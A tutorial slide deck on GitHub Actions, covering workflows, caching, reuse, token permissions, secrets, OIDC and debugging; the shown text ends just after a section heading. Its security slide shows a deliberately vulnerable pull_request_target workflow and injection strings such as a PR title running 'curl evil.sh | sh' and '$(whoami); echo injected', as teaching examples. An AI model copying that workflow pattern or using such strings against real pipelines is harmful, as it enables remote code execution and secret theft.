# Introduction to GitHub Actions

**Write, debug, secure and speed up workflows, from the first YAML file to a protected main branch**

*Every workflow in this deck ran for real on GitHub, in [this repository's Actions tab](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions), and the run IDs are linked from the slides*

```
Event -> Workflow -> Jobs -> Steps -> Checks
```

Triggers  |  Matrices  |  Caching  |  Reuse  |  Security  |  Rulesets

---

## Table of Contents

1. [Topics](#slide-01--topics)
2. [What GitHub Actions Is, and Where Jobs Run](#slide-02--what-github-actions-is-and-where-jobs-run)
3. [Anatomy of a Workflow File](#slide-03--anatomy-of-a-workflow-file)
4. [Triggers: What Starts a Workflow](#slide-04--triggers-what-starts-a-workflow)
5. [Expressions, Contexts and Conditions](#slide-05--expressions-contexts-and-conditions)
6. [Matrices: One Job, Many Combinations](#slide-06--matrices-one-job-many-combinations)
7. [Jobs Together: needs, Outputs and Service Containers](#slide-07--jobs-together-needs-outputs-and-service-containers)
8. [Caching: Don't Rebuild What Hasn't Changed](#slide-08--caching-dont-rebuild-what-hasnt-changed)
9. [Artifacts, Job Summaries and Annotations](#slide-09--artifacts-job-summaries-and-annotations)
10. [Reuse: Composite Actions and Reusable Workflows](#slide-10--reuse-composite-actions-and-reusable-workflows)
11. [Writing Your Own Action](#slide-11--writing-your-own-action)
12. [Security: A Least-Privilege GITHUB_TOKEN](#slide-12--security-a-least-privilege-github_token)
13. [Secrets and Environments](#slide-13--secrets-and-environments)
14. [OIDC, Pinning by SHA, and Dependabot](#slide-14--oidc-pinning-by-sha-and-dependabot)
15. [pull_request_target and Script Injection](#slide-15--pull_request_target-and-script-injection)
16. [Debugging a Workflow](#slide-16--debugging-a-workflow)
17. [Real Failures from This GitHub](#slide-17--real-failures-from-this-github)
18. [Cost, Limits and Speed](#slide-18--cost-limits-and-speed)
19. [Protecting main: Branch Protection and Rulesets](#slide-19--protecting-main-branch-protection-and-rulesets)
20. [Required Checks, Shown Blocking](#slide-20--required-checks-shown-blocking)
21. [Quality Gates Beyond Tests: Lighthouse CI](#slide-21--quality-gates-beyond-tests-lighthouse-ci)
22. [Real Workflows: a PyTorch Matrix and a Rust Kernel](#slide-22--real-workflows-a-pytorch-matrix-and-a-rust-kernel)
23. [Real Workflows: Cross-Repository Integration](#slide-23--real-workflows-cross-repository-integration)
24. [Actions vs Jenkins vs GitLab CI](#slide-24--actions-vs-jenkins-vs-gitlab-ci)
25. [Takeaways and Next Steps](#slide-25--takeaways-and-next-steps)

---

## Slide 01 — Topics

### Writing Workflows

- Events, workflows, jobs, steps and runners
- The workflow file, line by line; triggers
- Expressions, contexts and `if:` conditions
- Matrices, job outputs, service containers

### Making Them Fast and Reusable

- Caching, artifacts, job summaries, annotations
- Composite actions and reusable workflows
- Writing a JavaScript or Docker action
- Cost, limits, concurrency groups, path filters

### Making Them Safe

- A least-privilege `GITHUB_TOKEN`
- Secrets, environments and protection rules
- OIDC, pinning by SHA, Dependabot
- `pull_request_target` and script injection

### Running Them for Real

- Debugging, and real failures from this GitHub
- Protecting `main`: rulesets and required checks
- Quality gates beyond tests: Lighthouse CI
- Real workflows; Actions vs Jenkins vs GitLab CI

Each new term is defined in plain words the first time it appears, and listed with its slide in the README's [Key terms](README.md#key-terms).

---

## Slide 02 — What GitHub Actions Is, and Where Jobs Run

GitHub Actions is the automation system built into GitHub. Something happens in a repository, and GitHub runs the YAML files you keep in `.github/workflows/` on machines it provides or that you provide.

```
Event (push, PR, cron…) ──► Workflow run (one YAML file)
                              ├── Job: test  (checkout → setup-python → pytest)   on runner ubuntu-24.04
                              ├── Job: lint  (checkout → ruff check)              on another fresh runner
                              └── Job: report  needs: [test, lint]  → download artifacts; starts after both pass
```

- **Event**: something that happens (a push, a pull request, a schedule, a button press) and can start workflows
- **Workflow**: one YAML file in `.github/workflows/`; each time it starts is a **run**
- **Job**: a group of steps that runs on one fresh machine. Jobs run in parallel unless one `needs` another
- **Step**: one shell command (`run`) or one packaged **action** (`uses`)
- **Runner**: the machine that runs a job

| Runner kind | What it is | Use it when |
|-------------|------------|-------------|
| **GitHub-hosted** (standard) | a fresh VM per job, deleted afterwards: `ubuntu-24.04`, `windows-latest`, `macos-latest`… | almost always; free on public repos |
| **Larger runners** | GitHub-hosted, with more CPU, memory or disk, a GPU or a static IP; Team and Enterprise plans, always billed per minute | builds are too slow or too big for standard ones |
| **Self-hosted** | your own machine running the runner agent, picked by **labels** (`runs-on: [self-hosted, linux, fpga]`) | special hardware, licensed tools, private networks. Don't attach one to a public repo: a pull request from a **fork** (someone's copy of the repo) could run code on it |

Every demo here used standard GitHub-hosted Ubuntu runners. See [About runners](https://docs.github.com/en/actions/concepts/runners).

---

## Slide 03 — Anatomy of a Workflow File

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

permissions:
  contents: read

env:
  PIP_DISABLE_PIP_VERSION_CHECK: "1"

defaults:
  run:
    shell: bash

jobs:
  gate:
    name: Demo gate
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
        with:
          python-version: "3.12"
      - run: pip install -r demo/requirements.txt
      - name: Tests (report skips with -rs)
        run: pytest -rs demo
```

`.github/workflows/ci.yml` in this repo: the check that guards `main` (slide 20). A **check** is the pass/fail mark GitHub shows on a commit or pull request; each job reports one. Green on push, [run 37214324600](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214324600).

**Top level**

- `name`: the label in the Actions tab
- `on`: which **events** start it, with filters
- `permissions`: what the job's automatic token may do (slide 12)
- `env`: environment variables for every step
- `defaults.run`: default shell and working directory for `run` steps

**Per job**

- `jobs.<id>`: the job's ID; `name` is what reviewers and rulesets see
- `runs-on`: the runner label
- `timeout-minutes`: kill it if it hangs (default 360)
- `steps`: run in order; a failing step stops the job

**`uses` vs `run`**

- `uses: owner/repo@ref` runs an **action**: packaged, reusable code from another repo (or `./path` in this one)
- `with`: the action's inputs
- `run`: a shell script on the runner
- The long hex after `@` is a commit SHA: pinning, slide 14

---

## Slide 04 — Triggers: What Starts a Workflow

```yaml
on:
  push:
    branches: [main, "release/**"]
    paths-ignore: ["**.md"]
  pull_request:
    types: [opened, synchronize, reopened]
  schedule:
    - cron: "17 3 * * 1-5"      # 03:17 UTC on weekdays
  workflow_dispatch:
    inputs:
      level:
        type: choice
        options: [quick, full]
  workflow_call:
    inputs:
      python-version:
        type: string
        default: "3.12"
```

`demo/lint_examples/triggers.yml`: every common trigger in one file, checked with `actionlint` (clean). Each trigger also ran for real in a workflow of its own:

| Trigger | Starts a run when… | Ran here |
|---------|--------------------|----------|
| `push` | commits land on a branch or tag; `branches` / `paths` filters narrow it | [run 37214324600](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214324600) |
| `pull_request` | a pull request (PR) is opened or updated; runs on the PR's merge commit, read-only for forks | [run 37214705396](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214705396) |
| `schedule` | a cron time in UTC; may start late under load | linted only (not waited for) |
| `workflow_dispatch` | someone presses *Run workflow* or calls the API, with typed **inputs** | [run 37214439700](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214439700) |
| `workflow_call` | another workflow calls this one (slide 10) | [run 37214324885](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214324885) |

```yaml
on:
  workflow_dispatch:
    inputs:
      level:
        description: How much to run
        type: choice
        options: [quick, full]
        default: quick
      dry_run:
        description: Print the plan only
        type: boolean
        default: true
      note:
        description: Free text (treated as untrusted)
        type: string
        default: hello
```

Started with `gh workflow run demo-dispatch.yml -f level=full -f dry_run=false`. Inputs arrive as the `inputs` context.

---

## Slide 05 — Expressions, Contexts and Conditions

An **expression** is `${{ … }}`: GitHub evaluates it before the step runs. A **context** is a named object it can read.

| Context | Holds |
|---------|-------|
| `github` | the event and run: `event_name`, `ref_name`, `sha`, `actor`, `event.*` |
| `env` | variables set with `env:` |
| `matrix` | this leg's matrix values (slide 06) |
| `secrets` | encrypted secrets (slide 13) |
| `needs` | results and outputs of jobs this one needs |
| `steps` | earlier steps' `outputs`, `outcome`, `conclusion` (by step `id`) |
| `inputs`, `runner`, `vars` | dispatch/call inputs; the runner's OS and temp dir; plain config variables |

`if:` skips a step or job unless its expression is true. With no status function, `if:` implies `success()`: "everything before me passed". `failure()` = something earlier failed; `always()` = run regardless (clean-up, reports); `cancelled()` = the run was cancelled.

```yaml
status:
  needs: [prepare, service]
  runs-on: ubuntu-24.04
  steps:
    - id: flaky
      name: A step allowed to fail
      continue-on-error: true
      run: exit 3
    - name: Runs only because the step above failed
      if: steps.flaky.outcome == 'failure'
      run: echo "outcome=${{ steps.flaky.outcome }} conclusion=${{ steps.flaky.conclusion }}"
    - name: Skipped, because the job has not failed
      if: failure()
      run: echo "never printed"
    - name: Always runs (clean-up)
      if: always()
      run: echo "event=${{ github.event_name }} actor=${{ github.actor }} ref=${{ github.ref_name }}"
```

```text
outcome=failure conclusion=success
##[debug]Evaluating: failure()
##[debug]=> false
##[debug]Evaluating: always()
##[debug]=> true
event=push actor=BrendanJamesLynskey ref=main
```

[run 37214324637](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214324637) (debug re-run, attempt 2). `continue-on-error` makes a failed step's **outcome** `failure` but its **conclusion** `success`, so the job stays green and `failure()` is false.

---

## Slide 06 — Matrices: One Job, Many Combinations

```yaml
test:
  name: test (py${{ matrix.python }}, ${{ matrix.os }})
  runs-on: ${{ matrix.os }}
  timeout-minutes: 10
  strategy:
    fail-fast: false
    max-parallel: 3
    matrix:
      os: [ubuntu-24.04, ubuntu-22.04]
      python: ["3.10", "3.12", "3.13"]
      exclude:
        - os: ubuntu-22.04
          python: "3.13"
      include:
        - os: ubuntu-24.04
          python: "3.13"
          coverage: true
```

- A **matrix** runs the job once per combination of the listed values: 2 OSes × 3 Pythons = 6 **legs**
- `exclude` removes a combination (now 5); `include` adds keys to a matching leg (here `coverage: true`) or adds a new leg
- `fail-fast: false`: one red leg doesn't cancel the others (the default is `true`)
- `max-parallel: 3`: at most three legs at once
- Each leg is its own check, named from `name:`, e.g. `test (py3.10, ubuntu-22.04)`. Without a `name:` GitHub appends the values: `test (3.10)`

![Run summary of the matrix demo: 5 jobs completed, then the report job](images/matrix_run.png)

[run 37214874461](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214874461): five legs, then `report`, which `needs` them. The notice comes from the `coverage` leg's `::notice` (slide 09). Screenshot as a logged-out visitor sees it.

---

## Slide 07 — Jobs Together: needs, Outputs and Service Containers

```yaml
jobs:
  prepare:
    runs-on: ubuntu-24.04
    outputs:
      stamp: ${{ steps.s.outputs.stamp }}
    steps:
      - id: s
        run: echo "stamp=$(date -u +%Y%m%dT%H%M%S)-${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"

  service:
    needs: prepare
    runs-on: ubuntu-24.04
    services:
      redis:
        image: redis:7-alpine
        ports: ["6379:6379"]
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 5s
          --health-timeout 3s
          --health-retries 5
    steps:
      - name: Talk to the service container
        run: |
          python3 - <<'PY'
          import socket
          s = socket.create_connection(("localhost", 6379), timeout=5)
          s.sendall(b"PING\r\n")
          reply = s.recv(64)
          print("redis replied", reply)
          assert reply == b"+PONG\r\n"
          PY
      - run: echo "stamp from prepare = ${{ needs.prepare.outputs.stamp }}"
```

**needs and outputs**

- `needs: prepare` makes `service` wait for `prepare` and skip if it fails
- A step writes `name=value` to the file `$GITHUB_OUTPUT`; the job re-exports it under `outputs:`; later jobs read `needs.prepare.outputs.stamp`
- Jobs share no disk: pass small values as outputs, files as artifacts (slide 09)

**Service containers**

- A **service container** is a Docker container (a database, a cache) that runs beside the job for its lifetime
- `ports` maps it to `localhost`; `--health-cmd` makes the job wait until it is ready
- Linux runners only

```text
redis replied b'+PONG\r\n'
stamp from prepare = 20261004T154736-f592127
```

[run 37214324637](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214324637). The transformer explainer's real CI starts Postgres the same way for its end-to-end and Lighthouse jobs (slide 21).

---

## Slide 08 — Caching: Don't Rebuild What Hasn't Changed

```yaml
- uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
  with:
    python-version: ${{ matrix.python }}
    cache: pip
    cache-dependency-path: demo/requirements.txt
- name: Cache the generated dataset
  id: data
  uses: actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
  with:
    path: .cache/data
    key: data-${{ runner.os }}-${{ hashFiles('demo/make_data.py') }}
- name: Build the dataset (only on a cache miss)
  if: steps.data.outputs.cache-hit != 'true'
  run: python demo/make_data.py .cache/data
```

- A **cache** saves a directory at the end of a job and restores it at the start of a later one, looked up by a **key**
- Build the key from what the contents depend on: `hashFiles(…)` changes when the file does, so the cache invalidates itself
- `setup-python` (and `setup-node`, `setup-go`…) cache package downloads with one line: `cache: pip`
- `steps.<id>.outputs.cache-hit` lets you skip the expensive step

| Run | Dataset cache | pip cache |
|-----|---------------|-----------|
| [run 37214324617](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214324617) (first) | miss in every leg; one leg saved it | miss; saved per Python and OS |
| [run 37214874461](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214874461) (second) | **hit in all 5 legs**; build step skipped | **hit in all 5 legs** |

```text
Cache not found for input keys: data-Linux-f0fb67ba…
Failed to save: Unable to reserve cache with key data-Linux-f0fb67ba…,
  another job may be creating this cache.
…
Cache restored from key: data-Linux-f0fb67ba…
```

The first run's legs raced to save the same key; the losers' "Failed to save" is a warning, not a failure. The key uses `runner.os` (`Linux`), so both Ubuntu versions share it.

Unused entries are evicted after 7 days, and a repository holds 10 GB by default ([dependency caching](https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching), October 2026). A run can restore caches from its own branch, the default branch and (for a PR) the base branch. Never cache secrets: anyone with read access can open a PR and read the base branch's caches.

---

## Slide 09 — Artifacts, Job Summaries and Annotations

```yaml
    - name: Annotate
      if: matrix.coverage
      run: echo "::notice file=demo/stats.py,line=4::coverage leg ran on Python ${{ matrix.python }}"
    - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
      with:
        name: junit-${{ matrix.python }}-${{ matrix.os }}
        path: report-*.xml
        retention-days: 5
    - name: Job summary
      run: |
        {
          echo "### Python ${{ matrix.python }} on ${{ matrix.os }}"
          echo "| dataset cache hit | tests |"
          echo "|---|---|"
          echo "| ${{ steps.data.outputs.cache-hit == 'true' }} | $(grep -o 'tests=\"[0-9]*\"' report-*.xml) |"
        } >> "$GITHUB_STEP_SUMMARY"
        cat "$GITHUB_STEP_SUMMARY"   # also in the log, for readers without a GitHub login

report:
  needs: test
  if: always()
  runs-on: ubuntu-24.04
  steps:
    - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
      with:
        pattern: junit-*
        merge-multiple: true
    - name: Summarise every leg
      run: |
        reports=(report-*.xml)
        echo "### ${#reports[@]} JUnit reports; matrix result: ${{ needs.test.result }}" >> "$GITHUB_STEP_SUMMARY"
        printf -- '- %s\n' "${reports[@]}" >> "$GITHUB_STEP_SUMMARY"
        cat "$GITHUB_STEP_SUMMARY"
```

![The run's Artifacts table: five junit artifacts](images/artifacts.png)

[run 37214874461](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214874461). An **artifact** is a file a job uploads to the run for people or later jobs to download. `retention-days: 5` made these expire on 9 October; the repository default is 90 days.

```text
### Python 3.13 on ubuntu-24.04
| dataset cache hit | tests |
|---|---|
| true | tests="4" |
### 5 JUnit reports; matrix result: success
```

A **job summary** is Markdown appended to `$GITHUB_STEP_SUMMARY`; GitHub renders it on the run page (signed-in viewers only, so these steps also `cat` it into the log). An **annotation** is a `::notice`, `::warning` or `::error` line that GitHub pins to a file and line (slide 06's screenshot).

---

## Slide 10 — Reuse: Composite Actions and Reusable Workflows

**Composite action** (`.github/actions/setup-demo/action.yml`): a **composite action** bundles several steps behind one `uses:`. Every `run` needs an explicit `shell`.

```yaml
name: Set up the demo
description: Python with a pip cache, plus the demo's test dependencies (a composite action).
inputs:
  python-version:
    description: Python version to install
    default: "3.12"
outputs:
  pytest-version:
    description: The pytest version installed
    value: ${{ steps.v.outputs.pytest }}
runs:
  using: composite
  steps:
    - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
      with:
        python-version: ${{ inputs.python-version }}
        cache: pip
        cache-dependency-path: demo/requirements.txt
    - shell: bash
      run: pip install -r demo/requirements.txt
    - id: v
      shell: bash
      run: echo "pytest=$(python -m pytest --version 2>&1 | awk '{print $2}')" >> "$GITHUB_OUTPUT"
```

**Reusable workflow**: a **reusable workflow** is a whole workflow (jobs, runners) that others call with `on: workflow_call`.

```yaml
on:
  workflow_call:
    inputs:
      python-version:
        type: string
        default: "3.12"
    outputs:
      pytest-version:
        description: pytest version used by the tests
        value: ${{ jobs.test.outputs.pytest }}

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-24.04
    outputs:
      pytest: ${{ steps.setup.outputs.pytest-version }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - id: setup
        uses: ./.github/actions/setup-demo
        with:
          python-version: ${{ inputs.python-version }}
      - run: pytest -rs demo
```

**The caller**

```yaml
jobs:
  py310:
    uses: ./.github/workflows/demo-reusable.yml
    with:
      python-version: "3.10"
  py313:
    uses: ./.github/workflows/demo-reusable.yml
    with:
      python-version: "3.13"
```

```yaml
report:
  needs: [py310, py313]
  runs-on: ubuntu-24.04
  steps:
    - run: echo "pytest ${{ needs.py310.outputs.pytest-version }} on 3.10 and ${{ needs.py313.outputs.pytest-version }} on 3.13"
```

```text
pytest 8.4.2 on 3.10 and 8.4.2 on 3.13
```

[run 37214324885](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214324885): the called jobs appear as `py310 / test` and `py313 / test`. Rule of thumb: share *steps* with a composite action, share *jobs* with a reusable workflow.

---

## Slide 11 — Writing Your Own Action

| Kind | `runs.using` | Good for | Watch out for |
|------|--------------|----------|---------------|
| **Composite** | `composite` | gluing existing steps and actions | no state between runs; set `shell` on every step |
| **JavaScript** | `node24` | fast start, any OS, calling GitHub's API | commit the bundled code (no `npm install` at run time); keep Node versions current |
| **Docker container** | `docker` | a fixed toolchain in any language | Linux runners only; built from a Dockerfile, the image builds on every run, so it starts slower |

```yaml
name: JS hello
description: A JavaScript action with no dependencies.
inputs:
  who:
    description: Who to greet
    default: world
outputs:
  greeting:
    description: The greeting it made
runs:
  using: node24
  main: index.js
```

```javascript
// Inputs arrive as INPUT_<NAME> environment variables; outputs go to the $GITHUB_OUTPUT file.
const fs = require("fs");
const who = process.env.INPUT_WHO || "world";
const greeting = `Hello, ${who}, from Node ${process.version}`;
console.log(greeting);
fs.appendFileSync(process.env.GITHUB_OUTPUT, `greeting=${greeting}\n`);
```

```yaml
name: Docker hello
description: A Docker container action (Linux runners only).
inputs:
  who:
    description: Who to greet
    default: world
runs:
  using: docker
  image: Dockerfile
  args: ["${{ inputs.who }}"]
```

```dockerfile
FROM alpine:3.20
COPY entrypoint.sh /entrypoint.sh
ENTRYPOINT ["/bin/sh", "/entrypoint.sh"]
```

```text
Hello, Actions, from Node v24.19.0
Hello, Actions, from 3.20.10 inside a container
JS action said 'Hello, Actions, from Node v24.19.0'
```

Both ran in [run 37214324885](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214324885) (job `own-actions`). A real JavaScript action would normally use the [actions/toolkit](https://github.com/actions/toolkit) packages; this one uses only the `INPUT_*` variables and the `$GITHUB_OUTPUT` file they wrap.

---

## Slide 12 — Security: A Least-Privilege GITHUB_TOKEN

```yaml
permissions: {}   # nothing by default; each job asks for what it needs

jobs:
  read-only:
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    steps:
      - name: Reading the repo works
        env:
          GH_TOKEN: ${{ github.token }}
        run: gh api "repos/$GITHUB_REPOSITORY/contents/README.md" --jq .name
      - name: Writing (creating an issue label) is refused
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          if gh api -X POST "repos/$GITHUB_REPOSITORY/labels" -f name="demo-$GITHUB_RUN_ID" > out.txt 2> err.txt; then
            echo "::error::the token could write, which it should not"; exit 1
          fi
          echo "refused as expected: $(grep -o 'HTTP [0-9]*' err.txt | head -1)"
          echo "Write refused: \`$(grep -o 'HTTP [0-9]*' err.txt | head -1)\`" >> "$GITHUB_STEP_SUMMARY"
```

```text
README.md
refused as expected: HTTP 403
```

[run 37214432837](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214432837): reading worked; creating a label got `403 Resource not accessible by integration`.

- Every job gets a **GITHUB_TOKEN**: a short-lived credential for this repository, created when the job starts and revoked when it ends
- `permissions:` sets its **scopes** (what it may touch): `contents`, `issues`, `pull-requests`, `id-token`…, each `read`, `write` or `none`
- Set `permissions: {}` (nothing) at the top and grant per job. Any scope you list is granted; every scope you don't list becomes `none`
- This repository's default is read-only (`default_workflow_permissions: read`); older repositories and organisations may still default to read-write, so say it explicitly
- A **least-privilege** token limits the damage if a step, or an action you pulled in, is compromised

Pull requests from **forks** get a read-only token and no secrets on `pull_request`, whatever the workflow asks for. That is a safety feature; slide 15 shows the trigger that removes it.

[GITHUB_TOKEN](https://docs.github.com/en/actions/concepts/security/github_token) · [permissions syntax](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#permissions)

---

## Slide 13 — Secrets and Environments

```yaml
jobs:
  deploy:
    runs-on: ubuntu-24.04
    environment: demo   # a 1-minute wait timer and a main-only branch rule protect it
    steps:
      - name: Use an environment secret
        env:
          DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
        run: |
          echo "the secret is: $DEMO_SECRET"        # the log shows ***
          echo "its length is ${#DEMO_SECRET}"
```

```text
the secret is: ***
its length is 32
```

- A **secret** is an encrypted value set in the repository, organisation or environment settings (or `gh secret set`). Workflows read it as `secrets.NAME`
- The log **masks** the exact value as `***`. A transformed value (base64, a substring) is not masked
- Pass secrets through `env:` to the steps that need them, never in `with:` of untrusted actions

![Run page of the environment demo with a 1 minute wait timer on environment demo](images/env_run.png)

[run 37214444150](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214444150): queued 15:49:23, job started 15:50:27.

- An **environment** (e.g. `staging`, `production`) is a named deployment target with its own secrets and **protection rules**
- Rules: required reviewers (a person approves), a wait timer, and which branches may deploy. This demo's `demo` environment has a 1-minute timer and allows `main` only
- Required reviewers and wait timers work on any public repo; on private repos they need GitHub Enterprise ([docs](https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments))

---

## Slide 14 — OIDC, Pinning by SHA, and Dependabot

### OIDC instead of long-lived cloud keys

```yaml
oidc-claims:
  runs-on: ubuntu-24.04
  permissions:
    id-token: write   # lets the job ask GitHub for a signed OIDC token
  steps:
    - name: Request a token and print its claims (never the token itself)
      run: |
        RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
               "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.example.com")
```

```text
iss           https://token.actions.githubusercontent.com
aud           sts.example.com
sub           repo:BrendanJamesLynskey@27049659/Introduction_to_GitHub_Actions@1404583061:ref:refs/heads/main
ref           refs/heads/main
event_name    push
```

[run 37214432837](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214432837) printed the claims, never the token. **OIDC** (OpenID Connect): the job asks GitHub for a signed, minutes-long identity token; the cloud checks the claims (this repo, this branch) and swaps it for temporary credentials. No cloud key is stored in GitHub. The cloud side (an AWS role trust policy, an Azure federated credential, GCP workload identity) was **not run here**: no cloud account. See [OpenID Connect](https://docs.github.com/en/actions/concepts/security/openid-connect).

### Pin third-party actions to a full commit SHA

```yaml
- uses: actions/checkout@v7          # a tag: its owner can move it
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
```

A tag or branch can be re-pointed at new code by whoever controls (or compromises) that repository; a full 40-character SHA cannot. Every workflow in this repo pins by SHA, and the run log confirms it: `Download action repository 'actions/checkout@3d3c42e5…' (SHA:3d3c42e5…)`.

### Dependabot keeps the pins current

```yaml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
```

**Dependabot** is GitHub's bot that opens pull requests to update dependencies; with `github-actions` it bumps the SHA and its `# v7.0.1` comment together. Its first scan ran green ([run 37214327007](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214327007)) and found nothing to update.

---

## Slide 15 — pull_request_target and Script Injection

### Don't: two classic mistakes

```yaml
name: Comment on pull requests
on: pull_request_target            # runs with a write token and secrets, even for forks

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # checks out the fork's code...
      - run: |
          echo "Title: ${{ github.event.pull_request.title }}"   # ...and pastes its title into a script
          ./build.sh                                              # ...then runs the fork's code
```

```text
bad-injection.yml:13:31: "github.event.pull_request.title" is potentially untrusted. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#… [expression]
```

`actionlint` 1.7.12 output (kept outside `.github/workflows`, never run). It catches the injection, but not the `pull_request_target` + fork checkout pattern: review that by eye.

- `pull_request_target` runs the *base* repository's workflow with a write token and secrets, even for a fork's PR. Safe only if it never runs the fork's code
- **Script injection**: `${{ }}` is pasted into the script text *before* the shell runs. A PR titled `"; curl evil.sh | sh; "` becomes shell code

### Do: untrusted text through `env`

```yaml
name: Comment on pull requests
on: pull_request

permissions:
  contents: read

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Print the title safely
        env:
          TITLE: ${{ github.event.pull_request.title }}
        run: |
          printf 'Title: %s\n' "$TITLE"
```

```text
level=full dry_run=false
note=$(whoami); echo injected
```

[run 37214439700](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214439700): the dispatch demo passes `inputs.note` through `env`; given `$(whoami); echo injected`, it printed the text and ran nothing. Untrusted fields include PR titles and bodies, branch names, issue and comment text, and commit messages. See [Secure use reference](https://docs.github.com/en/actions/reference/security/secure-use).

---

## Slide 16 — Debugging a Workflow

![A failed CI run: the Demo gate job is red, with the annotation Process completed with exit code 1](images/failed_run.png)

[run 37214705396](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214705396), as a logged-out visitor sees it: the red job and its annotation. Step logs need a signed-in GitHub account; `gh run view RUN --log-failed` prints just the failing step:

```text
    def test_median_odd_and_even():
>       assert median([3, 1, 2]) == 3  # deliberately wrong: the ruleset demo
E       assert 2 == 3
E        +  where 2 = median([3, 1, 2])
demo/test_stats.py:11: AssertionError
========================= 1 failed, 3 passed in 0.25s ==========================
##[error]Process completed with exit code 1.
```

**A routine**

- Read the first red step's log from its *first* error, not the last line
- Re-run with **debug logging**: tick *Enable debug logging* in *Re-run jobs*, or `gh run rerun RUN --debug`. For every run, set the variable `ACTIONS_STEP_DEBUG=true` (step detail) or `ACTIONS_RUNNER_DEBUG=true` (runner diagnostics)
- Lint before pushing: `actionlint` catches bad expressions, unknown keys, injection and (with shellcheck) shell bugs
- Make the job print what it is about to do: tool versions, key paths, a `cat` of the summary

```text
##[debug]Evaluating: steps.s.outputs.stamp
##[debug]Result: '20261004T155230-f592127'
```

[run 37214324637](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214324637), attempt 2 with `--debug`: 274 `##[debug]` lines.

**Running locally:** [act](https://github.com/nektos/act) runs workflows in Docker on your machine. **Not run here**: this PC has no Docker. It approximates the hosted images, so treat a green `act` run as a hint, not proof.

---

## Slide 17 — Real Failures from This GitHub

### A test fixture git ignored

3 Oct 2026, [Disaggregated_Inference_Sim](https://github.com/BrendanJamesLynskey/Disaggregated_Inference_Sim): the first CI run ([run 37138193008](https://github.com/BrendanJamesLynskey/Disaggregated_Inference_Sim/actions/runs/37138193008)) failed with

```text
FileNotFoundError: … tests/fixtures/simfront_llama3_8b.json
1 failed, 35 passed
```

`.gitignore` had `*.json`, so the fixture existed only on the laptop where tests passed. Fixed by committing it with a `!tests/fixtures/*.json` exception ([eae7f7d](https://github.com/BrendanJamesLynskey/Disaggregated_Inference_Sim/commit/eae7f7d)), green in [run 37138267111](https://github.com/BrendanJamesLynskey/Disaggregated_Inference_Sim/actions/runs/37138267111). **Lesson:** CI starts from a clean checkout; that is its job.

### Green, but a test never ran

The simulators' JavaScript-port parity tests call `pytest.skip("node not installed")` when Node is missing. Reproduced in [run 37214324624](https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214324624):

```text
No Node:   SKIPPED [1] demo/test_parity.py:18:
           node not installed
           3 passed, 1 skipped
Required:  4 passed
```

Both jobs are green. **Lesson:** install what the tests need (`setup-node`), run `pytest -rs` so skips are listed, and make CI turn the skip into a failure (`REQUIRE_NODE=1` here).

### A stale git dependency

